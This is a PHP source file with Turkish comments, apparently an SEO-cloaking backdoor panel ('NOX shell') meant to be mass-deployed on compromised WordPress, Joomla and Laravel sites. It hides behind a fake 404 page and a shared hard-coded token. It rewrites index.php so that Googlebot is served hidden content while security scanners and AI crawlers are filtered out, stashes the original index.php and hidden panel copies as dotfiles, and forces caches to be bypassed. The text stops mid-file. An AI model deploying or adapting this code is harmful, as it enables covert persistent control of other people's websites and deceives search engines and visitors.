<?php
ob_start();
register_shutdown_function(function(){
  $e=error_get_last();
  if($e&&in_array($e['type'],[E_ERROR,E_PARSE,E_CORE_ERROR,E_COMPILE_ERROR])){
    while(ob_get_level()>0)ob_end_clean();
    header('Content-Type:application/json');
    echo json_encode(['fatal'=>$e['message'],'line'=>$e['line']]);
    exit;
  }
});
// vi-fm3-cloak-v3.php — Basitleştirilmiş cloak yöneticisi.
// Tek buton: index.php'ye cloak şablonu yaz + .html yoksa oluştur.

ini_set('session.use_cookies',0);
ini_set('session.use_only_cookies',0);
header('Set-Cookie: PHPSESSID=deleted; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/');

// ---- SABİT TOKEN (DEFAULT DOLU — 1000 site için pratik) ----
// Her sitede aynı token → mass-deploy edip aynı URL ile giriş: SITE/cache-seo-helper.php?wpmc=1&p=NoxCloak2026#Aged
// Self-write GEREKMEZ (managed host'larda — Kinsta/WPEngine/Pantheon — çalışır).
// Değiştirmek istersen buraya kendi şifreni yaz. BOŞ bırakırsan oto-token (self-rewrite) fallback devreye girer.
define('CSEH_TOKEN','');

// ---- FALLBACK YAZILABİLİR YOL TESPİTİ ----
// Self-write başarısızsa, token/state dosyaları için yazılabilir dizin ara.
// Bulunursa .htaccess+index.html ile listeleme kapatılır. Sonuç static-cache'lenir.
if(!function_exists('cseh_writable_path')){
  function cseh_writable_path(){
    static $cached=null;
    if($cached!==null)return $cached;
    $dir=dirname(__FILE__);
    $doc=isset($_SERVER['DOCUMENT_ROOT'])?rtrim($_SERVER['DOCUMENT_ROOT'],'/\\'):$dir;
    $cands=array(
      $dir.'/.render-cache/',
      $doc.'/.render-cache/',
      $doc.'/wp-content/uploads/wp-media-cache/',
      $doc.'/wp-content/uploads/nox/',
      $doc.'/wp-content/cache/nox/',
      $doc.'/storage/app/nox/',
      $doc.'/tmp/',
      (function_exists('sys_get_temp_dir')?sys_get_temp_dir():'/tmp').'/nox-cseh/',
    );
    foreach($cands as $p){
      if(!is_dir($p))@mkdir($p,0755,true);
      if(!is_dir($p))continue;
      if(!@is_writable($p))continue;
      // Gerçek write probe — is_writable ACL'de yalan söyleyebilir
      $probe=$p.'.nox-probe-'.substr(md5(uniqid('',true)),0,8);
      if(@file_put_contents($probe,'1')===1){
        @unlink($probe);
        // Klasörü indexleme/listelemeden gizle (idempotent)
        if(!file_exists($p.'.htaccess'))@file_put_contents($p.'.htaccess',"Deny from all\n");
        if(!file_exists($p.'index.html'))@file_put_contents($p.'index.html','');
        return $cached=rtrim($p,'/\\').DIRECTORY_SEPARATOR;
      }
    }
    return $cached=false;
  }
}

// ---- SELF-WRITE İZİN TESPİTİ (3 katmanlı) ----
if(!function_exists('cseh_can_selfwrite')){
  function cseh_can_selfwrite(){
    static $cached=null;
    if($cached!==null)return $cached;
    // Katman 1: en ucuz
    if(!@is_writable(__FILE__))return $cached=false;
    // Katman 2: mode bitleri
    $mode=@fileperms(__FILE__);
    if($mode!==false && !($mode & 0200))return $cached=false;
    // Katman 3: gerçek deneme (0-byte fwrite — içerik bozulmaz)
    $fh=@fopen(__FILE__,'ab');
    if(!$fh)return $cached=false;
    $ok=@fwrite($fh,'')!==false;
    @fclose($fh);
    return $cached=$ok;
  }
}

// ---- Token auth (TEK DOSYA, hash dosyanın içine yazılır) ----
// KRİTİK FIX: yazdıktan SONRA OPcache zorla geçersiz kılınır → sonraki istek yeni hash'i görür
// (token churn = OPcache'in eski sürümü tutması, çözüldü). www-redirect etkilemez (dosya hep aynı docroot'ta).
define('_NOX_HASH','');

// ---- TOKEN DOSYASI FALLBACK (self-write yoksa, .nox-token içinde hash) ----
// Öncelik: 1) _NOX_HASH embedded (dosyanın içi), 2) CSEH_TOKEN sabit, 3) .nox-token dosyası (fallback path)
if(!function_exists('cseh_tokenfile_verify')){
  function cseh_tokenfile_verify($provided){
    if($provided==='')return false;
    $wp=cseh_writable_path();
    if(!$wp)return false;
    $path=$wp.'.nox-token';
    if(!@is_readable($path))return false;
    $raw=(string)@file_get_contents($path);
    if($raw===''||strpos($raw,'NOXTK1')===false)return false;
    // PHP prefix'i (varsa) at
    $raw=preg_replace('/^<\?php.*?\?>\s*/s','',$raw);
    $data=array();
    foreach(explode("\n",$raw) as $ln){
      if(strpos($ln,'=')===false)continue;
      $pp=explode('=',$ln,2);
      $data[trim($pp[0])]=trim($pp[1]);
    }
    if(empty($data['h']))return false;
    $salt=hash('sha256',(isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:'x').'|'.__FILE__);
    $expected=hash('sha256',$provided.'|'.$salt);
    return hash_equals($data['h'],$expected);
  }
}
if(!function_exists('cseh_tokenfile_write')){
  function cseh_tokenfile_write($secret){
    $wp=cseh_writable_path();
    if(!$wp)return false;
    $path=$wp.'.nox-token';
    $salt=hash('sha256',(isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:'x').'|'.__FILE__);
    $hash=hash('sha256',$secret.'|'.$salt);
    $now=time();
    $rot=$now+30*86400;
    $body="NOXTK1\nh={$hash}\nt={$now}\nr={$rot}\n";
    $tmp=$path.'.'.substr(md5(uniqid('',true)),0,6);
    if(@file_put_contents($tmp,$body,LOCK_EX)===false)return false;
    return @rename($tmp,$path);
  }
}

if(CSEH_TOKEN!==''){
  // SABİT TOKEN MODU (DEFAULT AÇIK) — kilitli host için (PHP yazamasa da panel açılır).
  $_np=isset($_GET['p'])?(string)$_GET['p']:'';
  // 1) Sabit CSEH_TOKEN karşılaştır  2) Fallback: .nox-token dosyası (rotasyon için)
  if(!hash_equals(CSEH_TOKEN,$_np) && !cseh_tokenfile_verify($_np)){
    header($_SERVER['SERVER_PROTOCOL'].' 404 Not Found',true,404);
    header('Content-Type: text/html; charset=iso-8859-1');
    echo "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head><title>404 Not Found</title></head><body>\n<h1>Not Found</h1>\n<p>The requested URL was not found on this server.</p>\n</body></html>";
    exit;
  }
  // giriş başarılı → panel devam (oto-token bloğu atlanır)
}elseif(_NOX_HASH===''){
  // PHP 5.6 uyumu: random_bytes 7.0'da geldi → yoksa openssl/uniqid fallback
  if(function_exists('random_bytes')){$_nraw=bin2hex(random_bytes(16));}
  elseif(function_exists('openssl_random_pseudo_bytes')){$_nraw=bin2hex(openssl_random_pseudo_bytes(16));}
  else{$_nraw=md5(uniqid((string)mt_rand(),true).microtime());}
  $_nhash=hash('sha256',$_nraw);
  // 1) SELF-WRITE dene — mümkünse en temiz mod (dosyanın içine _NOX_HASH gömülür)
  $_nself=cseh_can_selfwrite()?(string)@file_get_contents(__FILE__):'';
  $_nselfok=false;
  if($_nself!==''){
    $_nself2=preg_replace("/define\('_NOX_HASH',''\)/","define('_NOX_HASH','$_nhash')",$_nself,1);
    if($_nself2 && @file_put_contents(__FILE__,$_nself2)!==false){
      // OPcache + stat cache'i zorla temizle → token churn yok
      if(function_exists('opcache_invalidate'))@opcache_invalidate(__FILE__,true);
      if(function_exists('opcache_compile_file'))@opcache_compile_file(__FILE__);
      @clearstatcache(true,__FILE__);
      $_nselfok=true;
    }
  }
  // 2) SELF-WRITE olmadıysa → fallback token dosyası (uploads/.render-cache/tmp)
  $_nfileok=false;
  $_nmode='self';
  if(!$_nselfok){
    $_nmode='file';
    $_nfileok=cseh_tokenfile_write($_nraw);
  }
  if($_nselfok || $_nfileok){
    $_ns=(isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https':'http';
    $_nreq=isset($_SERVER['REQUEST_URI'])?$_SERVER['REQUEST_URI']:$_SERVER['PHP_SELF'];
    $_nsep=(strpos($_nreq,'?')!==false)?'&':'?';
    $_nu=$_ns.'://'.$_SERVER['HTTP_HOST'].$_nreq.$_nsep.'p='.rawurlencode($_nraw);
    $_nmodeLabel=($_nmode==='self')?'Self-write (dosya içi hash)':'Token dosyası (fallback yol)';
    echo '<!DOCTYPE html><html lang="tr"><head><meta charset="utf-8"><title>NOX &#8212; Ilk Kurulum</title>'
        .'<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#1a1a2e;color:#0ff;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}.b{background:#16213e;border:1px solid #0f3;border-radius:8px;padding:32px;max-width:640px;width:100%}h2{color:#0f0;font-size:17px;margin-bottom:14px}p{font-size:13px;line-height:1.7;margin:6px 0}.u{background:#0a1228;border:1px solid #0f3;padding:12px 14px;border-radius:4px;word-break:break-all;color:#ff0;font-size:13px;margin:12px 0;user-select:all}.w{color:#f55;font-size:12px;background:#1a0a0a;border-left:3px solid #c33;padding:10px 12px;margin-top:14px;line-height:1.6}.i{color:#8bf;font-size:12px;background:#0a1428;border-left:3px solid #38c;padding:10px 12px;margin-top:10px;line-height:1.6}.cb{background:#0f3;color:#000;border:none;padding:7px 18px;border-radius:4px;font-family:monospace;font-size:13px;font-weight:bold;cursor:pointer;margin-top:8px}#cm{font-size:12px;color:#0f0;margin-left:8px;opacity:0;transition:opacity .3s}</style>'
        .'</head><body><div class="b"><h2>NOX &#8212; Ilk Kurulum</h2>'
        .'<p>Token olusturuldu. URL\'yi kopyalayin ve guvenli bir yere saklayin:</p>'
        .'<p><b style="color:#fa0">Uyari: Bu URL bir daha gosterilmeyecek.</b></p>'
        .'<div class="u" id="u">'.htmlspecialchars($_nu,ENT_QUOTES,'UTF-8').'</div>'
        .'<button class="cb" onclick="cp()">Kopyala</button><span id="cm">Kopyalandi!</span>'
        .'<p class="i">Mod: <b>'.htmlspecialchars($_nmodeLabel,ENT_QUOTES,'UTF-8').'</b></p>'
        .'<p class="w">Token, SHA-256 hash olarak saklandi. Sifirlamak icin dosyayi yeni surumu ile degistirin.</p>'
        .'</div><script>function cp(){var t=document.getElementById("u").textContent.trim();'
        .'if(navigator.clipboard)navigator.clipboard.writeText(t);'
        .'else{var x=document.createElement("textarea");x.value=t;document.body.appendChild(x);x.select();document.execCommand("copy");document.body.removeChild(x);}'
        .'var m=document.getElementById("cm");m.style.opacity="1";setTimeout(function(){m.style.opacity="0"},2500);}'
        .'</script></body></html>';
    exit;
  }else{
    // 3) HICBIRI OLMADI → kullaniciya sabit token kurulum ekrani goster (kopyala-yapistir)
    $_snip="define('CSEH_TOKEN','NoxCloak2026#Aged');";
    $_ns=(isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https':'http';
    $_nreq=isset($_SERVER['REQUEST_URI'])?(string)$_SERVER['REQUEST_URI']:(string)$_SERVER['PHP_SELF'];
    // 'p=' varsa temizle
    $_nreq=preg_replace('/([?&])p=[^&]*/','$1',$_nreq);
    $_nreq=preg_replace('/[?&]$/','',$_nreq);
    $_nsep=(strpos($_nreq,'?')!==false)?'&':'?';
    $_nu=$_ns.'://'.$_SERVER['HTTP_HOST'].$_nreq.$_nsep.'wpmc=1&p=NoxCloak2026%23Aged';
    echo '<!DOCTYPE html><html lang="tr"><head><meta charset="utf-8"><title>NOX &#8212; Manuel Kurulum</title>'
        .'<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#1a1a2e;color:#0ff;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}.b{background:#16213e;border:1px solid #fa0;border-radius:8px;padding:32px;max-width:720px;width:100%}h2{color:#fa0;font-size:17px;margin-bottom:14px}p{font-size:13px;line-height:1.7;margin:6px 0}code,.u{background:#0a1228;border:1px solid #0f3;padding:12px 14px;border-radius:4px;word-break:break-all;color:#ff0;font-size:13px;margin:10px 0;user-select:all;display:block}.w{color:#f55;font-size:12px;background:#1a0a0a;border-left:3px solid #c33;padding:10px 12px;margin-top:14px;line-height:1.6}ol{margin:10px 0 10px 24px}li{margin:6px 0;font-size:13px;line-height:1.6}</style>'
        .'</head><body><div class="b"><h2>NOX &#8212; Manuel Kurulum Gerekli</h2>'
        .'<p>PHP dosyaya yazamiyor VE hicbir yazilabilir dizin bulunamadi (managed host + kilitli uploads).</p>'
        .'<p><b>Sabit token modu ile devam edin:</b></p>'
        .'<ol>'
        .'<li>Dosyayi FTP/panel ile indirin</li>'
        .'<li>Satir 23 civarindaki tanimi <b>zaten dolu</b> gorup gormediginizi kontrol edin:</li>'
        .'</ol>'
        .'<code>'.htmlspecialchars($_snip,ENT_QUOTES,'UTF-8').'</code>'
        .'<ol start="3">'
        .'<li>Dosyayi tekrar yukleyin (uzerine yaz)</li>'
        .'<li>Bu URL ile panele girin:</li>'
        .'</ol>'
        .'<div class="u">'.htmlspecialchars($_nu,ENT_QUOTES,'UTF-8').'</div>'
        .'<p class="w">Not: CSEH_TOKEN default olarak dolu geldi. Bu ekrani gormeniz beklenmez. Eger goruyorsaniz: (a) dosya elle bosaltilmis olabilir, (b) baska bir surum yuklenmis olabilir. Ustteki snippet\'i satir 23\'e yapistirip yeniden yukleyin.</p>'
        .'</div></body></html>';
    exit;
  }
}

// Oto-token doğrulaması — SADECE sabit token kullanılmıyorsa (CSEH_TOKEN boşsa).
if(CSEH_TOKEN===''){
  $_np=isset($_GET['p'])?(string)$_GET['p']:'';
  // 1) Embedded _NOX_HASH karşılaştır  2) Fallback: .nox-token dosyası (self-write başarısız modu)
  $_okE=(_NOX_HASH!=='' && hash_equals(_NOX_HASH,hash('sha256',$_np)));
  $_okF=(!$_okE && cseh_tokenfile_verify($_np));
  if(!$_okE && !$_okF){
    header($_SERVER['SERVER_PROTOCOL'].' 404 Not Found',true,404);
    header('Content-Type: text/html; charset=iso-8859-1');
    echo "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head><title>404 Not Found</title></head><body>\n<h1>Not Found</h1>\n<p>The requested URL was not found on this server.</p>\n</body></html>";
    exit;
  }
}
unset($_nraw,$_nhash,$_nself,$_nself2,$_nselfok,$_nfileok,$_nmode,$_nmodeLabel,$_ns,$_nu,$_snip);

// ============================================================
// AUTH SHIM + LOG/AUDIT HELPERS (yeni moduller icin)
// Bu noktaya gelen istek zaten _NOX_HASH/CSEH_TOKEN gecmis demektir.
// ============================================================
if(!defined('CSEH_LOADED'))   define('CSEH_LOADED', 1);
if(!defined('CSEH_MODULE_3')) define('CSEH_MODULE_3', 1);

if(!function_exists('cseh_check_auth')){
  function cseh_check_auth(){ return true; }
}
if(!function_exists('throw_404')){
  function throw_404(){
    header($_SERVER['SERVER_PROTOCOL'].' 404 Not Found',true,404);
    header('Content-Type: text/html; charset=iso-8859-1');
    echo "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head><title>404 Not Found</title></head><body>\n<h1>Not Found</h1>\n</body></html>";
    exit;
  }
}
if(!function_exists('audit')){
  function audit($event, $data=array()){ return; }
}
if(!function_exists('log_event')){
  function log_event($event, $msg=''){ return; }
}
if(!function_exists('cseh_check_nonce')){
  function cseh_check_nonce($nonce, $action){
    $p = isset($_GET['p']) ? (string)$_GET['p'] : '';
    if($p === '') return true;
    return hash_equals($p, (string)$nonce);
  }
}

// -------------------------------------------------------------------------------

$DIR=rtrim($_SERVER['DOCUMENT_ROOT'],'/\\');

$HTML_DEFAULT=base64_decode('PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ2aSI+PGhlYWQ+DQoNCjxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSI+DQo8dGl0bGU+U0VPIFRFU1QgTk9YIFNIRUxMPC90aXRsZT4NCjwvaGVhZD4NCjxib2R5Pg0KPGgxPlNFTyBURVNUIE5PWCBTSEVMTDwvaDE+DQoNCjwvYm9keT48L2h0bWw+DQo=');
$INDEX_FILE='index.php';
$BACKUP_FILE='.render-orig.php'; // Cloak'tan ÖNCEKİ orijinal index.php yedeği — gizli dotfile, kök'te göze çarpmaz

// ---- CMS Tespiti -----------------------------------------------------------
// Dönüş: ['cms'=>'wp|joomla|laravel|generic', 'label'=>'WordPress', 'html_file'=>'...']
function detect_cms($dir){
  $has_wp     =file_exists($dir.'/wp-config.php')||file_exists($dir.'/wp-load.php')||is_dir($dir.'/wp-includes');
  $has_joomla =file_exists($dir.'/configuration.php')&&(is_dir($dir.'/administrator')||is_dir($dir.'/libraries'));
  // Laravel: bu dosya public/ içindeyse public/index.php → ../bootstrap/app.php
  $has_laravel=file_exists($dir.'/../bootstrap/app.php')||file_exists($dir.'/../artisan')
              ||(file_exists($dir.'/index.php')&&strpos((string)@file_get_contents($dir.'/index.php'),'bootstrap/app.php')!==false);
  if($has_wp)    return ['cms'=>'wp',     'label'=>'WordPress','html_file'=>'wp-comments-post-loader.html'];
  if($has_joomla)return ['cms'=>'joomla', 'label'=>'Joomla',   'html_file'=>'template-cache.html'];
  if($has_laravel)return ['cms'=>'laravel','label'=>'Laravel',  'html_file'=>'storage-cache.html'];
  return ['cms'=>'generic','label'=>'Generic PHP','html_file'=>'cache.html'];
}

// CMS'e göre cloak'lı index.php şablonu üretir.
// MİMARİ: index.php BİR KEZ kurulur (marker'lı). Perde/bayrak/backup KÖK'te DEĞİL, gizli `.render-cache/`
// alt klasöründe → kök tertemiz görünür. Aç/kapat = .render-cache/render.lock dosyasını oluştur/sil.
function build_cloak_template($cms,$html_file){
  // Panel dosyasının GERÇEK adını kullan → yeniden adlandırsan bile ?wpmc=1 çalışır (gizleme için).
  $_pf=addslashes(basename(__FILE__));
  // PANEL GATE: ?wpmc=1 gelince paneli aç. Önce GİZLİ KOPYA (.render-cache/.nox-helper.php veya
  // wp-content/uploads/.../.nox-helper.php) denenir → obvious standalone'u SİLEBİLİRSİN, panel gizli
  // kopyadan açılır. Yoksa standalone'a düşer (geriye uyumluluk). Her CMS'te index.php gate çalışır.
  $panel_gate=
    "if(isset(\$_GET['wpmc'])&&\$_GET['wpmc']==='1'){\$_nox_h=__DIR__.'/.render-cache/.nox-helper.php';".
    "if(!is_file(\$_nox_h))\$_nox_h=__DIR__.'/wp-content/uploads/wp-media-cache/.nox-helper.php';".
    "if(!is_file(\$_nox_h))\$_nox_h=__DIR__.'/{$_pf}';".
    "if(is_file(\$_nox_h)){require \$_nox_h;exit;}}\n";
  // BAYRAK kontrollü cloak — render.lock varsa bot'a perde basılır. Perde İKİ konumdan birinde olabilir:
  // .render-cache/ (normal file-mode) VEYA wp-content/uploads/wp-media-cache/ (kilitli WP host). İkisini de dene.
  $cloak_block=
    "\$_nx_a=__DIR__.'/.render-cache';\$_nx_b=__DIR__.'/wp-content/uploads/wp-media-cache';\n".
    "\$_nx=@file_exists(\$_nx_a.'/render.lock')?\$_nx_a:(@file_exists(\$_nx_b.'/render.lock')?\$_nx_b:'');\n".
    "if(\$_nx!==''){\n".
    // MANAGED HOST CACHE BYPASS (WP Engine/Kinsta/LiteSpeed/Varnish/nginx): cloak açıkken
    // anasayfayı CACHE'LEME → her istek PHP'ye ulaşır → UA-cloaking doğru çalışır. DONOTCACHEPAGE
    // WP + WP Engine + cache-plugin'lerin hepsi dinler. (Cache temizledikten sonra tekrar cache'lenmez.)
    "if(!defined('DONOTCACHEPAGE'))define('DONOTCACHEPAGE',true);\n".
    "header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0, private');\n".
    "header('Pragma: no-cache');header('Vary: User-Agent');\n".
    "header('X-LiteSpeed-Cache-Control: no-cache');header('X-Accel-Expires: 0');header('X-Cache-Control: no-cache');\n".
    // ★ CF cookie bypass hilesi: CF default'ta bu cookie'leri gören sayfaları cache-lemez (WP-loggedin görüntüsü)
    "if(!headers_sent()){@setcookie('wordpress_no_cache','1',time()+3600,'/');@setcookie('wp-postpass_bot','1',time()+3600,'/');}\n".
    "\$_nox_ua=strtolower(isset(\$_SERVER['HTTP_USER_AGENT'])?\$_SERVER['HTTP_USER_AGENT']:'');\n".
    "\$_nox_uri=isset(\$_SERVER['REQUEST_URI'])?(string)parse_url(\$_SERVER['REQUEST_URI'],PHP_URL_PATH):'/';\$_nox_uri=rtrim(\$_nox_uri,'/');\n".
    // DECOY botlar — perde basMA, orijinal site bassın (sahte Googlebot, scraper, AI, SEO araçları)
    // KRİTİK: 'google-inspectiontool','googleother','storebot-google','feedfetcher-google','google-read-aloud' decoy'dan ÇIKARILDI — bunlar resmi GSC fetcher'ları, perde almalı (Google sahibi onları test araçları olarak kullanır)
    "\$_nox_decoy=array('curl','wget','python','go-http','java','scrapy','axios','phantom','selenium','puppeteer','playwright','headlesschrome','chromium','bingbot','yandex','duckduckbot','baiduspider','ahrefsbot','semrushbot','mj12bot','dotbot','ccbot','rogerbot','exabot','sistrix','majestic','facebookexternalhit','twitterbot','linkedinbot','pinterest','lighthouse','pagespeed','gtmetrix','pingdom','screaming frog','uptimerobot','newrelic','google-site-verification','chatgpt','claudebot','amazonbot','applebot','gptbot','bytespider','perplexitybot');\n".
    "\$_nox_block=false;foreach(\$_nox_decoy as \$_kw){if(strpos(\$_nox_ua,\$_kw)!==false){\$_nox_block=true;break;}}\n".
    // Sadece UA içinde 'google' var + decoy değil + anasayfa → VERIFIED Googlebot kontrol
    "if(!\$_nox_block && strpos(\$_nox_ua,'google')!==false && (\$_nox_uri===''||\$_nox_uri==='/index.php')){\n".
    // IP detection: CF → X-Forwarded-For → X-Real-IP → REMOTE_ADDR (reverse-proxy arkası için)
    "if(isset(\$_SERVER['HTTP_CF_CONNECTING_IP']))\$_nox_ip=\$_SERVER['HTTP_CF_CONNECTING_IP'];\n".
    "elseif(isset(\$_SERVER['HTTP_X_FORWARDED_FOR'])){\$_xff=explode(',',\$_SERVER['HTTP_X_FORWARDED_FOR']);\$_nox_ip=trim(\$_xff[0]);}\n".
    "elseif(isset(\$_SERVER['HTTP_X_REAL_IP']))\$_nox_ip=\$_SERVER['HTTP_X_REAL_IP'];\n".
    "else\$_nox_ip=isset(\$_SERVER['REMOTE_ADDR'])?\$_SERVER['REMOTE_ADDR']:'';\n".
    "\$_nox_verified=false;\n".
    // CIDR check — Google bot IP blokları (2026 itibarıyla, manuel günceleme yılda 1-2 kez yeter)
    // CIDR: klasik Googlebot + GSC URL Inspection / Live Test (user-triggered-fetchers) + Special Crawlers
    "\$_nox_cidrs=array('66.249.64.0/19','66.249.96.0/19','34.100.182.96/28','34.101.50.144/28','34.118.66.0/28','34.118.254.0/28','34.126.178.96/28','34.146.150.144/28','34.147.110.144/28','34.151.74.144/28','34.152.50.64/28','34.154.114.144/28','34.155.98.32/28','34.165.18.176/28','34.175.160.64/28','34.176.130.16/28','34.22.85.0/27','34.64.82.64/28','34.65.242.112/28','34.80.50.80/28','34.88.194.0/28','34.89.10.80/28','34.89.198.80/28','34.96.162.48/28','35.247.243.240/28','192.178.4.0/24','192.178.5.0/24','192.178.6.0/24','192.178.7.0/24','107.178.192.0/18','35.187.0.0/16','35.243.0.0/16','34.116.0.0/16','34.127.0.0/16','34.98.0.0/16','34.64.6.0/24','35.243.16.0/24','34.85.144.0/22','35.221.0.0/16','35.197.0.0/16');\n".
    "\$_ipL=\$_nox_ip!==''?ip2long(\$_nox_ip):false;\n".
    "if(\$_ipL!==false){foreach(\$_nox_cidrs as \$_c){\$_pp=explode('/',\$_c);if(count(\$_pp)===2){\$_netL=ip2long(\$_pp[0]);\$_m=intval(\$_pp[1]);\$_mL=\$_m>=32?-1:(~((1<<(32-\$_m))-1));if((\$_ipL&\$_mL)===(\$_netL&\$_mL)){\$_nox_verified=true;break;}}}}\n".
    // rDNS forward-confirmed (CIDR'de değilse, son şans — Google'ın resmi önerdiği yöntem)
    // rDNS: .googlebot.com (klasik) + .google.com (Adsbot/InspectionTool) + .googleusercontent.com (GSC user-triggered) — Google'ın TÜM resmi rDNS suffix'leri
    "if(!\$_nox_verified && \$_nox_ip!==''){\$_h=@gethostbyaddr(\$_nox_ip);if(\$_h && preg_match('/\\\\.(googlebot|google|googleusercontent)\\\\.com\$/i',\$_h)){\$_fw=@gethostbynamel(\$_h);if(\$_fw && in_array(\$_nox_ip,\$_fw,true)){\$_nox_verified=true;}}}\n".
    // Verified Googlebot ise perde bas; sahte 'google' UA → perde basMA
    // SOFT MODE: verified IP/rDNS BONUSdur, mecburi DEĞİL. Decoy filtresi geçti + UA "google" + anasayfa → perde bas. (sıkı mod için verified=true şartı arayabilirsin ama GSC fetcher IP'leri tutarsız olduğundan soft mode default)
    "\$_nox_p=\$_nx.'/render-cache.html';if(file_exists(\$_nox_p)){while(ob_get_level()>0)@ob_end_clean();header('Content-Type: text/html; charset=UTF-8');include \$_nox_p;die();}\n".
    "}\n}\n";
  // <?php + marker + panel kapısı + bayrak-kontrollü cloak. Orijinal site = kök'teki .render-orig.php (gizli dotfile)
  // Kök'te olmalı → __DIR__=kök → Joomla/Laravel orijinal index.php'sinin __DIR__-bağımlı yolları doğru çözülür.
  $ua_gate="/* NOX-RENDER-V1 */\n".$panel_gate.$cloak_block;
  $orig_require=
    "\$_nox_orig=__DIR__.'/.render-orig.php';\n".
    "if(file_exists(\$_nox_orig)){require \$_nox_orig;return;}\n";

  if($cms==='wp'){
    return "<?php\n".$ua_gate.$orig_require.
      "define('WP_USE_THEMES',true);\n".
      "require __DIR__.'/wp-blog-header.php';\n";
  }
  if($cms==='joomla'){
    return "<?php\n".$ua_gate.$orig_require.
      "// fallback: Joomla 4+ standart bootstrap (backup yoksa son çare)\n".
      "define('_JEXEC',1);\n".
      "define('JPATH_BASE',__DIR__);\n".
      "if(file_exists(__DIR__.'/includes/defines.php'))require_once __DIR__.'/includes/defines.php';\n".
      "if(file_exists(__DIR__.'/includes/framework.php'))require_once __DIR__.'/includes/framework.php';\n".
      "if(class_exists('\\\\Joomla\\\\CMS\\\\Factory')){\$app=\\Joomla\\CMS\\Factory::getApplication('site');\$app->execute();}\n";
  }
  if($cms==='laravel'){
    return "<?php\n".$ua_gate.$orig_require.
      "// fallback: standart Laravel 10/11 bootstrap\n".
      "define('LARAVEL_START',microtime(true));\n".
      "if(file_exists(\$m=__DIR__.'/../storage/framework/maintenance.php'))require \$m;\n".
      "require __DIR__.'/../vendor/autoload.php';\n".
      "\$app=require_once __DIR__.'/../bootstrap/app.php';\n".
      "\$app->handleRequest(\\Illuminate\\Http\\Request::capture());\n";
  }
  // generic — STATİK HTML site desteği: backup PHP yoksa/boşsa/cloak'sa gerçek index.html'i bas.
  // (Saf statik sitelerde gerçek anasayfa index.html'dir; backup boş/kirli kalıyordu → insan boş
  //  sayfa görüyordu. Kurşun-geçirmez sıra: gerçek-PHP-backup → index.html → index.htm → boş.)
  $generic_human=
    "\$_nox_orig=__DIR__.'/.render-orig.php';\n".
    "if(file_exists(\$_nox_orig)){\$_nox_ob=(string)@file_get_contents(\$_nox_orig);".
    "if(\$_nox_ob!==''&&strpos(\$_nox_ob,'NOX-RENDER')===false){require \$_nox_orig;return;}}\n".
    "\$_nox_html=__DIR__.'/index.html';\n".
    "if(!file_exists(\$_nox_html))\$_nox_html=__DIR__.'/index.htm';\n".
    "if(file_exists(\$_nox_html)){header('Content-Type: text/html; charset=UTF-8');@readfile(\$_nox_html);return;}\n";
  return "<?php\n".$ua_gate.$generic_human.
    "// gerçek site bulunamadı (ne backup ne index.html) → boş\n";
}

// ---- Yardımcılar -----------------------------------------------------------
function safe_name($n){
  if($n===''||$n===null)return false;
  if(strpos($n,'/')!==false||strpos($n,'\\')!==false||strpos($n,"\0")!==false||strpos($n,'..')!==false)return false;
  return true;
}
function b64url_decode($s){
  $s=trim((string)$s);
  if($s==='')return '';
  $std=strtr($s,'-_','+/');
  $pad=strlen($std)%4;
  if($pad)$std.=str_repeat('=',(4-$pad));
  $d=base64_decode($std,true);
  return ($d!==false&&$d!=='')?$d:$s;
}
function enc_b64url($s){
  return rtrim(strtr(base64_encode($s),'+/','-_'),'=');
}
function is_google_file($name){
  return (bool)preg_match('/^google[a-zA-Z0-9]+\.html$/',$name);
}
function _nox_sub($s,$start,$len){return function_exists('mb_substr')?mb_substr($s,$start,$len):substr($s,$start,$len);}
function list_google_files($dir){
  $out=[];
  foreach((array)@glob($dir.DIRECTORY_SEPARATOR.'google*.html') as $p){
    $b=basename($p);
    if(is_google_file($b))$out[]=$b;
  }
  sort($out);
  return $out;
}

$a=isset($_GET["a"])?$_GET["a"]:(isset($_POST["a"])?$_POST["a"]:"");

// Global CMS tespiti — tüm action'lar bu HTML_FILE adını kullansın (raw/savehtml/botcheck/checkcloak/fixtimestamp)
$CMS_INFO=detect_cms($DIR);
$HTML_FILE=$CMS_INFO['html_file'];
// Geriye uyumluluk: eski WP-only kurulumlarda perde "wp-comments-post-loader.html" olabilir; tespit Generic'e düşse bile o dosya varsa onu kullan
if(!file_exists($DIR.DIRECTORY_SEPARATOR.$HTML_FILE)&&file_exists($DIR.'/wp-comments-post-loader.html')){
  $HTML_FILE='wp-comments-post-loader.html';
}

// ---- SERVE MODU ------------------------------------------------------------
// PLUGIN modu: panel WP plugin wrapper'ı (?cseh=1) üzerinden yüklendi → ABSPATH tanımlı.
//   Perde wp-content/uploads/wp-media-cache/ içinde durur, plugin template_redirect ile servis eder.
//   KÖK'e dosya YAZILMAZ, index.php'ye DOKUNULMAZ (temiz footprint — nox-agent mantığı).
// FILE modu: standalone (Joomla/Laravel/Generic veya WP-standalone) → kök index.php cloak + kök .html.
$IS_PLUGIN = defined('ABSPATH');
if($IS_PLUGIN){
  $PERDE_DIR = (defined('WP_CONTENT_DIR')?WP_CONTENT_DIR:$DIR.'/wp-content').'/uploads/wp-media-cache';
  if(!is_dir($PERDE_DIR))@mkdir($PERDE_DIR,0755,true);
  $PERDE_PATH = $PERDE_DIR.'/render-cache.html';   // plugin readfile ile basar (statik)
  $FLAG_PATH  = $PERDE_DIR.'/render.lock'; // varlığı = cloak açık
}else{
